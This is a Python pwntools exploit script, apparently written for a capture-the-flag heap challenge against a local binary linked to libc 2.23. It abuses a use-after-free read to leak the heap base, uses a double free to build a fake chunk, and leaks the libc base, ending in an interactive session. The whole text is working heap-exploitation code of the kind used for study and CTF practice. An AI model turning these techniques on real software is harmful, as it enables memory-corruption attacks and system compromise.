#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.23.so")

def allocate(index,content):
    p.sendlineafter("Your choice:","1")
    p.sendlineafter("Index:",str(index))
    p.sendafter("Content:",content)

def show(index):
    p.sendlineafter("Your choice:","2")
    p.sendlineafter("Index:",str(index))
    return p.recvuntil('Done!')[:-5]
def free(index):
    p.sendlineafter("Your choice:","3")
    p.sendlineafter("Index:",str(index))

allocate(0,'a'*8) #chunk0
allocate(1,'b'*8) #chunk1
allocate(2,'c'*8)
free(2)
free(1)
free(0)
leak = show(1)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
heap_base = leak -0xc0
log.critical("Heap base: {}".format(hex(heap_base)))
allocate(0,'a'*8)
allocate(1,'b'*8)
allocate(2,'c'*100)
free(0)
free(1)
free(0)
fake_chunk = heap_base+0x10
allocate(0,p64(fake_chunk))
allocate(1,b'd'*8)
allocate(2,p64(0x0)+p64(0x61))
allocate(3,b'a'*0x40+p64(0x0)+p64(0xc1))
allocate(4,p64(0x0)+p64(0x61))
free(1)
leak = show(1)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x399b78
log.critical("Libc base address: {}".format(hex(libc.address)))

p.interactive()
